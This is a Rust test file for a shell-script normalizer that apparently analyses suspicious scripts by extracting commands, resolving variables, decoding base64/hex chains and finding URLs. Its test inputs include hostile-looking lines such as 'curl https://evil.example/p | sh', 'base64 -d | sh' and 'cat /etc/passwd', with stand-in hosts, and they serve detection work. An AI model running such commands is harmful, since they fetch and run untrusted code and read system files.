//! Semantic normalization integration tests for shell AST post-processing.

use arbitraitor_model::ids::Sha256Digest;
use arbitraitor_shell::{DecodeKind, ShellParser, normalize};
use base64::Engine as _;
use sha2::{Digest, Sha256};

fn normalize_source(
    source: &str,
) -> Result<arbitraitor_shell::NormalizationResult, Box<dyn std::error::Error>> {
    let mut parser = ShellParser::new()?;
    let parsed = parser.parse_str(source);
    Ok(normalize(&parsed.ast, source)?)
}

fn digest(bytes: &[u8]) -> Sha256Digest {
    Sha256Digest::new(Sha256::digest(bytes).into())
}

#[test]
fn extracts_simple_commands_from_ast() -> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source("wget http://evil.com\n")?;
    assert_eq!(result.commands[0].name, "wget");
    assert_eq!(result.commands[0].arguments, ["http://evil.com"]);
    Ok(())
}

#[test]
fn constant_propagation_resolves_variables() -> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source("X=bar; echo $X\n")?;
    assert_eq!(result.variable_bindings.get("X"), Some(&"bar".to_owned()));
    assert_eq!(result.commands[0].arguments, ["bar"]);
    Ok(())
}

#[test]
fn constant_propagation_chains_assignments() -> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source("X=hello; Y=\"$X world\"; echo $Y\n")?;
    assert_eq!(
        result.variable_bindings.get("Y"),
        Some(&"hello world".to_owned())
    );
    assert_eq!(result.commands[0].arguments, ["hello world"]);
    Ok(())
}

#[test]
fn pipe_graph_captures_data_flow() -> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source("cmd1 | cmd2 | cmd3\n")?;
    assert_eq!(result.data_flow.edges, [(0, 1), (1, 2)]);
    Ok(())
}

#[test]
fn base64_decode_chain_produces_child_artifact() -> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source("echo \"SGVsbG8=\" | base64 -d | sh\n")?;
    assert!(
        result
            .decoded_artifacts
            .iter()
            .any(|artifact| artifact.kind == DecodeKind::Base64 && artifact.content == b"Hello")
    );
    Ok(())
}

#[test]
fn hex_decode_chain_produces_child_artifact() -> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source("echo \"\\x48\\x65\\x6c\\x6c\\x6f\" | xxd -r -p\n")?;
    assert!(
        result
            .decoded_artifacts
            .iter()
            .any(|artifact| artifact.kind == DecodeKind::Hex && artifact.content == b"Hello")
    );
    Ok(())
}

#[test]
fn decoded_artifact_has_correct_sha256() -> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source("echo \"SGVsbG8=\" | base64 -d\n")?;
    let artifact = result
        .decoded_artifacts
        .iter()
        .find(|artifact| artifact.kind == DecodeKind::Base64)
        .ok_or("missing base64 artifact")?;
    assert_eq!(artifact.digest, digest(b"Hello"));
    Ok(())
}

#[test]
fn url_extraction_from_string_constants() -> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source("URL=https://evil.com/a.sh; wget \"$URL\"\n")?;
    assert!(
        result
            .urls
            .iter()
            .any(|url| url.url == "https://evil.com/a.sh")
    );
    Ok(())
}

#[test]
fn heredoc_content_becomes_child_artifact() -> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source("cat << 'EOF'\necho child\nEOF\n")?;
    assert!(result.decoded_artifacts.iter().any(
        |artifact| artifact.kind == DecodeKind::Heredoc && artifact.content == b"echo child\n"
    ));
    Ok(())
}

#[test]
fn oversized_decode_is_truncated_or_skipped() -> Result<(), Box<dyn std::error::Error>> {
    let oversized = "QQ==".repeat(600_000);
    let source = format!("echo {oversized} | base64 -d\n");
    let result = normalize_source(&source)?;
    assert!(result.decoded_artifacts.is_empty());
    Ok(())
}

#[test]
fn dynamic_variables_not_resolved() -> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source("echo $RANDOM\n")?;
    assert_eq!(result.commands[0].arguments, ["$RANDOM"]);
    assert!(result.variable_bindings.is_empty());
    Ok(())
}

#[test]
fn openssl_decode_chain() -> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source("echo \"SGVsbG8=\" | openssl enc -d -base64\n")?;
    assert!(
        result
            .decoded_artifacts
            .iter()
            .any(|artifact| artifact.kind == DecodeKind::OpenSsl && artifact.content == b"Hello")
    );
    Ok(())
}

#[test]
fn nested_command_substitution_records_outer_and_inner_commands()
-> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source(r#"echo "$(curl https://evil.example/p | sh)""#)?;
    assert!(result.commands.iter().any(|command| command.name == "echo"));
    assert!(result.commands.iter().any(|command| {
        command.name == "curl" && command.arguments == ["https://evil.example/p"]
    }));
    Ok(())
}

#[test]
fn assignment_command_substitution_records_inner_command() -> Result<(), Box<dyn std::error::Error>>
{
    let result = normalize_source(r#"X="$(wget https://evil.example/p)""#)?;
    assert!(result.commands.iter().any(|command| {
        command.name == "wget" && command.arguments == ["https://evil.example/p"]
    }));
    Ok(())
}

#[test]
fn process_substitution_records_inner_command_and_unmodeled_flow()
-> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source("diff <(cat /etc/passwd) /dev/null")?;
    assert!(result.commands.iter().any(|command| command.name == "diff"));
    assert!(
        result
            .commands
            .iter()
            .any(|command| { command.name == "cat" && command.arguments == ["/etc/passwd"] })
    );
    assert!(result.has_unmodeled_flow);
    Ok(())
}

#[test]
fn command_local_assignments_do_not_pollute_global_bindings()
-> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source(r#"URL=https://evil; URL=https://benign wget "$URL""#)?;
    let wget = result
        .commands
        .iter()
        .find(|command| command.name == "wget")
        .ok_or("missing wget command")?;
    assert_eq!(wget.arguments, ["https://evil"]);
    assert_eq!(
        result.variable_bindings.get("URL"),
        Some(&"https://evil".to_owned())
    );
    Ok(())
}

#[test]
fn accepts_exactly_32k_decoded_artifact() -> Result<(), Box<dyn std::error::Error>> {
    let payload = vec![b'A'; 32 * 1024];
    let encoded = base64::engine::general_purpose::STANDARD.encode(&payload);
    let result = normalize_source(&format!("printf %s {encoded} | base64 -d"))?;
    assert!(
        result
            .decoded_artifacts
            .iter()
            .any(|artifact| { artifact.kind == DecodeKind::Base64 && artifact.content == payload })
    );
    Ok(())
}

#[test]
fn rejects_32k_plus_one_decoded_artifact() -> Result<(), Box<dyn std::error::Error>> {
    let payload = vec![b'A'; (32 * 1024) + 1];
    let encoded = base64::engine::general_purpose::STANDARD.encode(payload);
    let result = normalize_source(&format!("printf %s {encoded} | base64 -d"))?;
    assert!(
        !result
            .decoded_artifacts
            .iter()
            .any(|artifact| artifact.kind == DecodeKind::Base64)
    );
    Ok(())
}

#[test]
fn aggregate_decoded_artifact_limit_is_enforced() -> Result<(), Box<dyn std::error::Error>> {
    let payload = vec![b'A'; 32 * 1024];
    let encoded = base64::engine::general_purpose::STANDARD.encode(payload);
    let mut source = String::new();
    for _ in 0..9 {
        source.push_str("printf %s ");
        source.push_str(&encoded);
        source.push_str(" | base64 -d\n");
    }
    let result = normalize_source(&source)?;
    assert_eq!(
        result
            .decoded_artifacts
            .iter()
            .filter(|artifact| artifact.kind == DecodeKind::Base64)
            .count(),
        8
    );
    assert!(
        result
            .notes
            .iter()
            .any(|note| note.contains("aggregate byte limit"))
    );
    Ok(())
}

#[test]
fn common_decode_chain_flag_variants_are_supported() -> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source(
        "echo -n SGVsbG8= | base64 -di\necho SGVsbG8= | base64 -D\necho 48656c6c6f | xxd -rp\necho 48656c6c6f | xxd -r -p\n",
    )?;
    assert_eq!(
        result
            .decoded_artifacts
            .iter()
            .filter(|artifact| artifact.content == b"Hello")
            .count(),
        4
    );
    Ok(())
}

#[test]
fn heredoc_consumed_by_decoder_produces_linked_decoded_artifact()
-> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source("base64 -d <<'EOF'\nSGVsbG8=\nEOF\n")?;
    assert!(result.decoded_artifacts.iter().any(|artifact| {
        artifact.kind == DecodeKind::Base64
            && artifact.content == b"Hello"
            && artifact.source_command_index == Some(0)
    }));
    assert!(result.has_unmodeled_flow);
    Ok(())
}

#[test]
fn tab_stripped_heredoc_is_decoded_after_tab_removal() -> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source("base64 -d <<-EOF\n\tSGVsbG8=\nEOF\n")?;
    assert!(
        result.decoded_artifacts.iter().any(|artifact| {
            artifact.kind == DecodeKind::Base64 && artifact.content == b"Hello"
        })
    );
    Ok(())
}
